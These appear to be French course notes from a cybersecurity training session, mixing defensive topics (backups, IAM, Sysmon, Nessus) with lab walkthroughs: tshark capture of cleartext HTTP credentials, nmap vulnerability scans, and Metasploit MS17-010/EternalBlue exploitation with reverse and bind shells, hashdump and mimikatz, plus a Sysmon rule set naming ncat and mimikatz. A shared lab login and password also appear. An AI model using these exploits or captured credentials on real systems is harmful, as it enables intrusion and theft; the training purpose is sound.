**En cas d'attaque des sauvegardes**

* Backup immuable
* Système de fichier en dehors des systèmes Windows (ex: NFS)
* PAM "Privileged Access Management" à surveillé sensiblement
* Ouvrir et isolé les réseaux uniquement le temps des Backups (Règle Firewall Schedule activer/désactiver la communication avec les devices de sauvegarde)



**Renforcer l'authentification (IAM)**

Contexte:

* Device de confiance (empreinte numérique, signature navigateur)
* GEOIP - (Localisation)
* Temps (Heure)

Comportement:

* Flux de téléchargement anormalement élevé (EDR/SIEM)

* FIDO (device de connection)

# Abréviations

**TTP = Tactiques, techniques et procédures**

Les TTP sont un concept essentiel dans l'étude du [terrorisme](https://fr.wikipedia.org/wiki/Terrorisme) et de la [cybercriminalité](https://fr.wikipedia.org/wiki/Sécurité_des_systèmes_d'information)[1](https://fr.wikipedia.org/wiki/Tactiques,_techniques_et_procédures#cite_note-Sullivan2008-1). Le rôle des TTP est d'identifier les modèles de comportement  individuels d'une activité ou d'une organisation particulière, et  d'examiner et de catégoriser les tactiques et les armes utilisées.

**CVE = Common Vulnerabilities and Exposures**

Une CVE désigne une vulnérabilité en particulier, et leur regroupement  permet d’établir un dictionnaire de toutes les vulnérabilités connues et publiques.

**CVSS = Common Vulnerability Scoring System**

Est un système d’évaluation de la criticité d’une vulnérabilité. Ce système, établi par le réseau [FIRST (Forum of Incident Response and Security Teams)](https://www.first.org/), est actuellement utilisé dans sa **version 3.1**.

![image-20250124143048274](.\image-20250124143048274.png)

**CWE  = Common Weakness Enumeration**

**CWE** est une [base de données](https://fr.wikipedia.org/wiki/Base_de_données) créée en 2006[1](https://fr.wikipedia.org/wiki/Common_Weakness_Enumeration#cite_note-1) de faiblesses communes. Une faiblesse est une condition dans un [logiciel](https://fr.wikipedia.org/wiki/Logiciel), [micrologiciel](https://fr.wikipedia.org/wiki/Firmware) ou [matériel](https://fr.wikipedia.org/wiki/Matériel_informatique), qui peut, dans certaines conditions, contribuer à l'insertion de [vulnérabilités](https://fr.wikipedia.org/wiki/Vulnérabilité_(informatique)). Cette liste est maintenue par l'organisme [MITRE](https://fr.wikipedia.org/wiki/MITRE)

**NVT = Network Vulnerability Test**

...

**SIEM = Security information and event management**

Un système de gestion des informations et des événements de sécurité (SIEM) est une solution de sécurité qui permet aux organisations de détecter les menaces avant qu'elles ne perturbent leurs activités.

**KPI = Key Performance Indicator** 

KPI permettent de visualiser la trajectoire et l’efficacité d’une  politique de sécurité, la pertinence de la stratégie et des actions menées. Ces métriques doivent être adaptées aux objectifs de sécurité et au contexte de chaque organisation. Les indicateurs de performance  peuvent être répartis en deux grandes typologies : 

• Les indicateurs opérationnels: (nombre de vulnérabilités, fréquence des mises à jour, nombre d’alertes de sécurité, etc.).

• Les indicateurs stratégiques: (état d’avancement de la mise en œuvre de la politique de sécurité du  système d’information, suivi des contrôles de sécurité, etc.).

**NIST Frawework = National Institute of Standards and Technology Frawework **

![image-20250124155057372](.\image-20250124155057372.png)

**ISO 27001**

L'ISO/CEI 27001 est une norme internationale de [sécurité des systèmes d'information](https://fr.wikipedia.org/wiki/Sécurité_des_systèmes_d'information) de l'[ISO](https://fr.wikipedia.org/wiki/Organisation_internationale_de_normalisation) et la [CEI](https://fr.wikipedia.org/wiki/Commission_électrotechnique_internationale). Publiée en octobre [2005](https://fr.wikipedia.org/wiki/2005) et révisée en 2013 et 2022, son titre est *"Technologies de l'information - Techniques de sécurité - Systèmes de gestion de sécurité de l'information - Exigences"*. Elle fait partie de la [suite ISO/CEI 27000](https://fr.wikipedia.org/wiki/Suite_ISO/CEI_27000) et permet de **certifier** des organisations.

# Angle d'attaque (ISM)

![image-20250123151247281](.\image-20250123151247281.png)

PREVENTION : Le travail en interne 

DETECTION : Sous-traité SOC/SIEM

REACTION : Travail commun entre l'entreprise et le sous-traitant



# Utils

**Informations sur IP**

https://whois.domaintools.com/

![image-20250123112654945](.\image-20250123112654945.png)

**Afficher les connexions en cours**

![image-20250123114046714](.\image-20250123114046714.png)

Se connecter à une console distante

![image-20250123114346054](.\image-20250123114346054.png)

**Exploiter les injections SQL**

Avec sqlmap pour obtenir des informations sur la BDD

**Vérifier le comportement d'un programme**

https://app.any.run/ permet d'exécuter des programmes et de vérifier l'activité de celui-ci sur le système et le réseau

![image-20250123161157495](.\image-20250123161157495.png)

Les soumissions publiques permettent de visualiser le cheminement d'une intrusion / attaque par programme.

![image-20250123161254171](.\image-20250123161254171.png)

![image-20250123161116995](.\image-20250123161116995.png)

## Analyser les logs d'une machine (Post-Incident)

EvtxHussar permet de structurer les logs d'une machine dans une arborescence lisible humainement.

```
.\EvtxHussar.exe -o AnalyseMyPC C:\Windows\System32\winevt\Logs
```



![image-20250123152214032](.\image-20250123152214032.png)

Par exemple l'installation d'un nouveau service "WASTP"

![image-20250123152435277](.\image-20250123152435277.png)

## Sysmon

Il fournit des informations détaillées sur les créations de processus,  les connexions réseau et les modifications apportées à l’heure de  création de fichier. En recueillant les événements qu’il génère à l’aide de la [collecte d’événements Windows](https://msdn.microsoft.com/library/windows/desktop/bb427443(v=vs.85).aspx) ou des agents [SIEM](https://en.wikipedia.org/wiki/security_information_and_event_management), puis en les analysant, vous pouvez identifier une activité malveillante ou anormale et comprendre comment les intrus et les logiciels  malveillants fonctionnent sur votre réseau.

**Installer le service**

```
.\Sysmon64.exe -accepteula -i sysmon.xml
```

(sysmon.xml est un exemple de configuration, voir \Outils\Sysmon)

Sortie:

```
System Monitor v15.15 - System activity monitor
By Mark Russinovich and Thomas Garnier
Copyright (C) 2014-2024 Microsoft Corporation
Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
Sysinternals - www.sysinternals.com

Loading configuration file with schema version 4.50
Sysmon schema version: 4.90
Configuration file validated.
Sysmon64 installed.
SysmonDrv installed.
Starting SysmonDrv.
SysmonDrv started.
Starting Sysmon64..
Sysmon64 started.
```

**Afficher les services**

```
services.msc
```

![image-20250123160156133](.\image-20250123160156133.png)

**Ouvrir l'observateur d'événements**

```
eventvwr.msc
```

![image-20250123163805656](.\image-20250123163805656.png)

Examiner

```
Microsoft > Windows > Sysmon > Operational
```

Ouvrez la calculatrice Windows

```
clac.exe
```

Retournez sur l'observateur d'événements et actualisez F5

![image-20250123164048206](.\image-20250123164048206.png)

Adapter la configuration XML en fonction du besoin (sysmon.xml).

```
<Sysmon schemaversion="4.50">
<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
<EventFiltering>

<!-- -eid 22 is DnsQuery-->
    <DnsQuery onmatch="include">
        <Image condition="end with">nslookup.exe</Image>
        <Image condition="end with">ping.exe</Image>
        <Image condition="end with">ncat.exe</Image>
    </DnsQuery>
	
<!-- -eid 12,13,14 are RegistryEvent-->
    <RegistryEvent onmatch="include">
        <TargetObject name="StartRunKey" condition="contains">CurrentVersion\Run</TargetObject>
    </RegistryEvent>
	
<!-- -eid 11 is FileCreate-->
    <FileCreate onmatch="include">
        <Image condition="end with">notepad.exe</Image>
    </FileCreate>

<!-- -eid 11 is FileCreate-->
    <FileCreate onmatch="include">
    </FileCreate>
	
<!-- -eid 10 is ProcessAccess-->
    <ProcessAccess onmatch="include">
        <SourceImage condition="end with">mimikatz.exe</SourceImage>
    </ProcessAccess>

<!-- -eid 7 is ImageLoad-->
    <ImageLoad onmatch="include">
     <!-- <Image condition="end with">calc.exe</Image>-->	
     <ImageLoaded condition="end with">cryptbase.dll</ImageLoaded>
    </ImageLoad>

<!-- -my eid 3 is NetworkConnect-->
   <NetworkConnect onmatch="include">
        <DestinationPort name="META CONNEXION" condition="is">4444</DestinationPort>
   </NetworkConnect>

   <NetworkConnect onmatch="include">
        <DestinationPort name="SCANV" condition="is">8844</DestinationPort>
   </NetworkConnect>


<!-- -eid 1: Process Creation -->
<ProcessCreate onmatch="include">
    <Image name="CalcProcess" condition="end with">calc.exe</Image>
</ProcessCreate>

<!-- -eid 25 is ProcessTampering-->
    <ProcessTampering onmatch="include">
        <Image name="SysmonSimulator ProcessTampering Simulation" condition="end with">cmd.exe</Image>
    </ProcessTampering>
<!-- -eid 24 is ClipboardChange-->
    <ClipboardChange onmatch="include">
        <Image condition="end with">SysmonSimulator.exe</Image>
    </ClipboardChange>
    
<!-- -eid 23 is FileDelete-->
    <FileDelete onmatch="include">
        <Image condition="end with">SysmonSimulator.exe</Image>
    </FileDelete>
    
	
</EventFiltering>
</Sysmon>
```

Exemple: Ajouter à la configuration le monitoring des connexion au port 2222 

![image-20250123165058921](.\image-20250123165058921.png)

Tester la connexion

![image-20250123164929802](.\image-20250123164929802.png)

Puis vérifier dans les événements

![image-20250123165008244](Y:\articles\Cyber\image-20250123165008244.png)

Exemple de config

https://github.com/SwiftOnSecurity/sysmon-config



# Proxy

Forcer le navigateur à utiliser un Proxy pour sortir sur Internet (avec filtrage). 

![image-20250123161928538](.\image-20250123161928538.png)

Seul le navigateur ira sur internet et non le reste de la machine.

![image-20250123161950875](.\image-20250123161950875.png)

# Chaine d'attaque

![image-20250123092647643](.\image-20250123092647643.png)



![image-20250123092722170](.\image-20250123092722170.png)

Détecter et bloquer un élément de la bloc-chain permet d'enrayer une attaque car une nouvelle technique d'attaque se trouve toujours à un niveau qui s'appuie toujours sur une étape précédente.

voir https://attack.mitre.org/

![image-20250123145824695](.\image-20250123145824695.png)

# Sources des logs

![image-20250123101501262](.\image-20250123101501262.png)

https://docs.google.com/document/d/1Y2N0Rr0jwkyV4OBhhgSow02ZUazVikAW_so0serWeps/edit?tab=t.0

**CONCEPTS**

- SLIDES
- [NOTES](https://docs.google.com/document/d/1AF2zRhuo734qNtSyIwwDBIKauDz4wvfqcyFVqiOK1GI/edit?usp=drive_link)

**PLATFORM**

- [LABS](https://docs.google.com/document/d/1rnnLDqo9iWS12blbsRC10u8IDLhrsFkVEjx3YmC_0yw/edit?usp=drive_link)
- TEAM

**RESOURCES**

- [TOOLS](https://docs.google.com/document/d/1UNMWYcjNVMM4z4ILWaDdapeUcAXHNVcMo52eL43ic-s/edit?usp=drive_link)
- RSC

**SESSION**

pen.sinuslabs.net 443

uX / Pass*2025

**GROUPE**

1. u1 J.Michel
2. u2 Kevin
3. u3 Matthieu
4. u4 Pierre
5. u5 J.François
6. u6 Thomas





ssh -p 443 u6@pen.sinuslabs.net

Pass*2025







**LABS CYBER SEC**

**LAB1: SNIFFING**

```shell
#1 listen for port 80 live capture
###################################

tshark -i eth0 -f "tcp port 80" 

#2 write capture to a file
###################################

touch http1.pcap; chmod a+w http1.pcap

tshark -i eth0 -f "tcp port 80" -w http1.pcap

#3 analyse tcp & http
###################################

tshark -r http1.pcap -Y 'tcp'

tshark -r http1.pcap -Y 'http'

#4 analyse packet text
###################################

tshark -r http1.pcap -Y 'http' -V > caphttp.txt

#5 analyse infos packets
###################################

tshark -r http1.pcap -Y 'http' -T fields -e frame.time -e ip.src -e ip.dst -e tcp.stream -e http.request.uri

#6 Credential Auth
###################################

touch http2.pcap; chmod a+w http2.pcap

tshark -i eth0 -f "tcp port 80" -w http2.pcap

tshark -r http2.pcap -Y 'http'

tshark -r http2.pcap -Y 'http.authbasic' -V | grep Cred

#7 Forms content
###################################

touch http3.pcap; chmod a+w http3.pcap

tshark -i eth0 -f "tcp port 80" -w http3.pcap

tshark -r http3.pcap -Y 'http.request.method=="POST"' -O http

tshark -r http3.pcap -Y 'http.request.method=="POST"' -O urlencoded-form

#8 listen for port 53 live capture
######################################

tshark -i eth0 -f "udp port 53" -w dns.pcap

#9 analyse infos packets
######################################

tshark -r dns.pcap -Y 'dns' -T fields -e frame.time -e ip.src -e ip.dst -e tcp.stream -e dns.qry.name > adns.txt


```

## Veille technique

Mettre en place un process d'information cyber sécurité pour être informé et mettre en place les correctifs.

CERT

https://www.cert.ssi.gouv.fr/a-propos/

## Scanner les différents segments du réseau pour identifier les faiblesses

### Identifier les authentifications en clair sur le réseau via HTTP

```
tshark -r http2.pcap -Y 'http.authbasic' -V | grep Cred
```

### Filtres WireShark

```
XXXX contains "YYYY"
XXXX == "YYYY"
```

### Affiche les réseaux (linux)

```
route -n
```



# Post incident

Eléments impactés

* identifier les vulnérabilités exploitées
* identifier les comptes exploités
* identifier les systèmes compromis 
* segments réseaux concernés

Actions:

* Patchs
* Réinitialisation
* revue des configs
* désinfection (malware)
* segmentation, isolation, filtrage

# Exigences Sécurité

Sécurisé = Confidentialité, Intégrité, Disponibilité

Niveaux d'applications: Réseau, Système, Base de données, Application

Assurer la traçabilité : LOG

AAA : 

* Authentification => Know, Have, Are (password, certificat, clé)
* Authorisation => Annuaire (AD)
* Accountability => Journal

Mécanismes déployables : 

* Confidentialité => Cryptage (certificats)

* Intégrité => Hashage (checksum), routine de vérification (Trigger en BDD)
* Disponibilité => Redondance

Risques : 

Worm = Réplication dans le système (déjà installé) => EPP

Trojan = Programme caché dans un autre (intrusion) => EDR

Sniffing = Vol de données (écoute sur le réseau) => NDR

# NOTES

Séparer les sauvegardes géographiquement (a ajouter au fichier du plan d'actions)

PRI = Plan de réponse aux incidents (élaboré et testé)

classifier les informations (sensible, confidentiel, public, ...)





**LABS CYBER SEC**

**LAB 2: SCANNING**

```shell
#######################################
#SCAN SERVICES | DECOUVERTE RESEAU
######################################

#NMAP fast detection : hosts alive

####################################

nmap -n -sP -oG 235.up 192.168.235.0/24 

nmap -n -sP -oG 225.up 192.168.225.0/24

nmap -n -sP -oG 215.up 192.168.215.0/24

cat 235.up | awk '{print $2}' | sed 's/Nmap//g' > 235.ips

#NMAP Fast discover common ports
###################################

nmap -n -F -iL 235.ips

nmap -n -F -iL 235.ips -oX 225.xml

nmap -n -F -iL 225.ips -oX 235.xml

nmap -n -F -iL 215.ips -oX 215.xml

#NMAP Version details
####################################

nmap -n -iL 225.ips -p 22,445,80 -sV -oX 225-sv.xml

nmap -n -iL 235.ips -p 22,445,80 -sV -oX 235-sv.xml

nmap -n -iL 215.ips -p 22,445,80 -sV -oX 215-sv.xml

nmap -n -iL 120.ips -p 22,445,80 -sV -oX 120-sv.xml

Nmap scan report for 192.168.235.14
Host is up (0.0016s latency).

PORT    STATE  SERVICE      VERSION
22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open   http         Apache httpd 2.4.29 ((Ubuntu))
445/tcp closed microsoft-ds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#dedicated scan

#21,22,23 → linux/network

#80,443 → web

#445,3389 → windows

#NMAP Discover network 120
####################################

nmap -n -sV -p 21,22,23,80,443,445,3389 192.168.120.0/24 -oX 120-sv.xml

#NMAP All Info
####################################

nmap -n -A 192.168.225.108

#NSE Scripts
###################################

ls /usr/share/nmap/srcipts | grep version, cve, vuln

nmap -n -p 445 --script smb-os-discovery.nse 192.168.120.180

nmap -n -p 445 --script smb-vuln-ms08-067.nse 192.168.120.150

nmap -n -p 3389 --script rdp-vuln-ms12-020.nse 192.168.120.150

nmap -n -p 445 --script smb-vuln-ms17-010.nse 192.168.120.180

**LAB1: SNIFFING**

#1 listen for port 80 live capture
###################################

tshark -i eth0 -f "tcp port 80" 

#2 write capture to a file
###################################

touch http1.pcap; chmod a+w http1.pcap

tshark -i eth0 -f "tcp port 80" -w http1.pcap

#3 analyse tcp & http
###################################

tshark -r http1.pcap -Y 'tcp'

tshark -r http1.pcap -Y 'http'

#4 analyse packet text
###################################

tshark -r http1.pcap -Y 'http' -V > caphttp.txt

#5 analyse infos packets
###################################

tshark -r http1.pcap -Y 'http' -T fields -e frame.time -e ip.src -e ip.dst -e tcp.stream -e http.request.uri

#6 Credential Auth
###################################

touch http2.pcap; chmod a+w http2.pcap

tshark -i eth0 -f "tcp port 80" -w http2.pcap

tshark -r http2.pcap -Y 'http'

tshark -r http2.pcap -Y 'http.authbasic' -V | grep Cred

#7 Forms content
###################################

touch http3.pcap; chmod a+w http3.pcap

tshark -i eth0 -f "tcp port 80" -w http3.pcap

tshark -r http3.pcap -Y 'http.request.method=="POST"' -O http

tshark -r http3.pcap -Y 'http.request.method=="POST"' -O urlencoded-form

#8 listen for port 53 live capture
######################################

tshark -i eth0 -f "udp port 53" -w dns.pcap

#9 analyse infos packets
######################################

tshark -r dns.pcap -Y 'dns' -T fields -e frame.time -e ip.src -e ip.dst -e tcp.stream -e dns.qry.name > adns.txt
```

### Detection vulnerabilité

https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange.nse

cvedetails.com

https://www.cvedetails.com/vendor/45/

```
ls /usr/share/nmap/scripts/ | grep "vuln"
```

afp-path-vuln.nse
ftp-vuln-cve2010-4221.nse
http-huawei-hg5xx-vuln.nse
http-iis-webdav-vuln.nse
http-vmware-path-vuln.nse
http-vuln-cve2006-3392.nse
http-vuln-cve2009-3960.nse
http-vuln-cve2010-0738.nse
http-vuln-cve2010-2861.nse
http-vuln-cve2011-3192.nse
http-vuln-cve2011-3368.nse
http-vuln-cve2012-1823.nse
http-vuln-cve2013-0156.nse
http-vuln-cve2013-6786.nse
http-vuln-cve2013-7091.nse
http-vuln-cve2014-2126.nse
http-vuln-cve2014-2127.nse
http-vuln-cve2014-2128.nse
http-vuln-cve2014-2129.nse
http-vuln-cve2014-3704.nse
http-vuln-cve2014-8877.nse
http-vuln-cve2015-1427.nse
http-vuln-cve2015-1635.nse
http-vuln-cve2017-1001000.nse
http-vuln-cve2017-5638.nse
http-vuln-cve2017-5689.nse
http-vuln-cve2017-8917.nse
http-vuln-misfortune-cookie.nse
http-vuln-wnr1000-creds.nse
mysql-vuln-cve2012-2122.nse
rdp-vuln-ms12-020.nse
rmi-vuln-classloader.nse
rsa-vuln-roca.nse
samba-vuln-cve-2012-1182.nse
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
smtp-vuln-cve2010-4344.nse
smtp-vuln-cve2011-1720.nse
smtp-vuln-cve2011-1764.nse
vulners.nse

## Obtenir la version exacte le OS

```shell
nmap -n -p 445 --script smb-os-discovery.nse 192.168.120.212
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-21 11:23 CET
Nmap scan report for 192.168.120.212
Host is up (0.078s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: srv12
|   NetBIOS computer name: SRV12\x00
|   Domain name: sinaps.lan
|   Forest name: sinaps.lan
|   FQDN: srv12.sinaps.lan
|_  System time: 2025-01-21T11:23:15+01:00

Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
```

**Détecter les ports et les versions approximatives**

```
nmap 192.168.225.210 -p 22,445,80 -n -sV
```

Résultat:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-21 11:30 CET
Nmap scan report for 192.168.225.210
Host is up (0.022s latency).

PORT    STATE  SERVICE      VERSION
22/tcp  closed ssh
80/tcp  closed http
445/tcp open   microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: CYBER)
Service Info: Host: PCA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

**Déterminer la version exacte**

```
nmap -n -p 445 --script smb-os-discovery.nse 192.168.225.210
```

Résultat:

```shell

Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-21 11:23 CET
Nmap scan report for 192.168.225.210
Host is up (0.013s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows 10 Enterprise LTSC 2021 19044 (Windows 10 Enterprise LTSC 2021 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: pca
|   NetBIOS computer name: PCA\x00
|   Domain name: cyber.lan
|   Forest name: cyber.lan
|   FQDN: pca.cyber.lan
|_  System time: 2025-01-21T10:23:38-08:00

Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds
```

**Déterminer si une vulnérabilité est existante sur ce serveur SMB**

```
nmap -n -p 445 --script smb-vuln-ms17-010.nse 192.168.120.212
```

Le résultat indique que le serveur est vulnérable

```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-21 11:28 CET
Nmap scan report for 192.168.120.212
Host is up (0.076s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```

# Outils de détection de vulnérabilités (BlueTeam)

**Nessus** est un outil de [sécurité informatique](https://fr.wikipedia.org/wiki/Sécurité_des_systèmes_d'information). Il signale les faiblesses potentielles ou avérées sur les machines testées. Ceci inclut, entre autres :

- les services vulnérables à des attaques permettant la [prise de contrôle](https://fr.wikipedia.org/wiki/Prise_de_contrôle) de la machine, l'accès à des informations sensibles (lecture de fichiers confidentiels par exemple), des dénis de service...
- les fautes de configuration (relais de messagerie ouvert par exemple)
- les patchs de sécurité non appliqués, que les failles corrigées soient exploitables ou non dans la configuration testée
- les [mots de passe](https://fr.wikipedia.org/wiki/Mot_de_passe) [par défaut](https://fr.wikipedia.org/wiki/Valeur_par_défaut), quelques mots de passe communs, et l'absence de mots de passe sur  certains comptes systèmes. Nessus peut aussi appeler le programme  externe Hydra ([de](https://de.wikipedia.org/wiki/Hydra_(software))) pour attaquer les mots de passe à l'aide d'un [dictionnaire](https://fr.wikipedia.org/wiki/Attaque_par_dictionnaire).
- les services jugés *faibles* (on suggère par exemple de remplacer [Telnet](https://fr.wikipedia.org/wiki/Telnet) par [SSH](https://fr.wikipedia.org/wiki/Secure_Shell))
- les [dénis de service](https://fr.wikipedia.org/wiki/Attaque_par_déni_de_service) contre la [pile TCP/IP](https://fr.wikipedia.org/wiki/Suite_des_protocoles_Internet)

## Licence

Nessus est disponible sous licence [GPL](https://fr.wikipedia.org/wiki/Licence_publique_générale_GNU) jusqu'à la version 2. Depuis la version 3, il est distribué sous  licence propriétaire, mais toujours gratuit pour utilisation personnelle (Home Feed). La version 2 est maintenue. Il existe aussi un [fork](https://fr.wikipedia.org/wiki/Fork_(développement_logiciel)) de Nessus 2 toujours sous licence GPL qui s'appelle [OpenVAS](https://fr.wikipedia.org/wiki/OpenVAS).

## Types de scans

Vulnérabilités => installation, version, etc... (sans credentials)

Vulnérabilités => scan sur les configs (avec credentials)

Compliance  => Check de configuration => niveau de conformité

Ajout comptes = Policies > New policy > [Type de scan, ex: Advanced] > Credentials

## Utilitaires de scans

**Linux**

nmap

masscan

**Windows**

netscan

angry ip scanner

**Identification de topologie**

traceroute

firewalking

## Document des règles de visibilités

Matrice des flux

https://cyberveille.esante.gouv.fr/sites/default/files/media/document/2023-12/ANS%20-%20Fiche%20technique%20%233%20-%20Formaliser%20une%20matrice%20de%20flux%20-%20KIT%20de%20cartographie%20du%20SI.pdf

## Notification d'alertes

* Firewalls

* EDRs

* SIEMs



**LABS CYBER SEC**

**LAB4:EXPLOITATION DES VULNERABILITIES**

```shell
#######################################

#EXPLOIT VULNERABILITIES SERVER SIDE

######################################

msfconsole

#EXPLOIT VULNERABILITY SHELL A

######################################

use windows/smb/ms17_010_psexec

set rhost 192.168.120.212

set PAYLOAD windows/shell/bind_tcp

set lport 4440

run

#EXPLOIT VULNERABILITY SHELL B

######################################

use windows/smb/ms17_010_psexec

set rhost 192.168.120.212

set PAYLOAD windows/x64/meterpreter/bind_tcp

set lport 5550

run

#POST EXPLOIT ACTIONS: NETWORK | SYSTEM

######################################

arp, ipconfig, netstat

shell, ps, download, upload, hashdump

#EXPLOIT VULNERABILITY REVERSE SHELL B

######################################

use windows/smb/ms17_010_psexec

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.235.15

set LPORT 5550

set RHOST 192.168.120.212

set DisableCourtesyShell True

exploit -j -z

#######################################

#EXPLOIT VULNERABILITIES V2

######################################

#EXPLOIT VULNERABILITY 2

######################################

use exploit/windows/smb/ms17_010_eternalblue

set PAYLOAD windows/x64/shell/bind_tcp

set RHOST 192.168.120.180

set lport 4440

set DisableCourtesyShell True

exploit -j -z

#EXPLOIT ACTIONS: NETWORK | SYSTEM

######################################

shell_to_meterpreter, screenshot, keylog, mimikatz

use exploit/windows/smb/ms17_010_eternalblue

set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST 192.168.235.15

set LPORT 5550

set RHOST 192.168.120.180

set DisableCourtesyShell True

exploit -j -z
```

# Exemple exploitation faille (PenTest)

> ATTENTION : Risque de plantage de la machine cible

```
msfconsole
```

**Charge l'exploit**

```
msf6 > use windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

**Définit la cible**

```
msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 192.168.120.212
rhost => 192.168.120.212
```

**Définit la charge utile (le type d'attaque) - Ici prend possession du SHELL**

Exemple le PAYLOAD <windows/x64/meterpreter/bind_tcp> permet d'utiliser le shell METERPRETER avec des fonctions supplémentaires (upload, download,...)

```
msf6 exploit(windows/smb/ms17_010_psexec) > set PAYLOAD windows/shell/bind_tcp
PAYLOAD => windows/shell/bind_tcp
```

**Définit le port d'écoute locale**

```
msf6 exploit(windows/smb/ms17_010_psexec) > set lport 4440
lport => 4440
```

**Démarrage de l'exploit**

```
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] 192.168.120.212:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 192.168.120.212:445 - Built a write-what-where primitive...
[+] 192.168.120.212:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.120.212:445 - Selecting PowerShell target
[*] 192.168.120.212:445 - Executing the payload...
[+] 192.168.120.212:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 192.168.120.212:4440
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.120.212
[*] Command shell session 1 opened (192.168.235.15:35911 -> 192.168.120.212:4440) at 2025-01-21 16:19:20 +0100


Shell Banner:
```

**Maintenant vous êtes sous le Shell de la machine cible (Windows)**

```
Microsoft Windows [Version 6.3.9600]
-----

C:\Windows\system32>
```

**Votre utilisateur est : authority\system**

```
C:\Windows\system32>whoami
whoami
nt authority\system
```

# Exemples de commandes du Payload Meterpreter

```shell
[*] 192.168.120.212:445 - Target OS: Windows Server 2012 R2 Standard 9600
[*] 192.168.120.212:445 - Built a write-what-where primitive...
[+] 192.168.120.212:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.120.212:445 - Selecting PowerShell target
[*] 192.168.120.212:445 - Executing the payload...
[+] 192.168.120.212:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 192.168.120.212:4446
[*] Sending stage (200774 bytes) to 192.168.120.212
[*] Meterpreter session 1 opened (192.168.235.15:44485 -> 192.168.120.212:4446) at 2025-01-21 16:59:01 +0100

meterpreter > uid
[-] Unknown command: uid
meterpreter > ?
```

## **Core Commands**

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


## Stdapi: File system Commands

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
---------------------------

    Command       Description
    -------       -----------
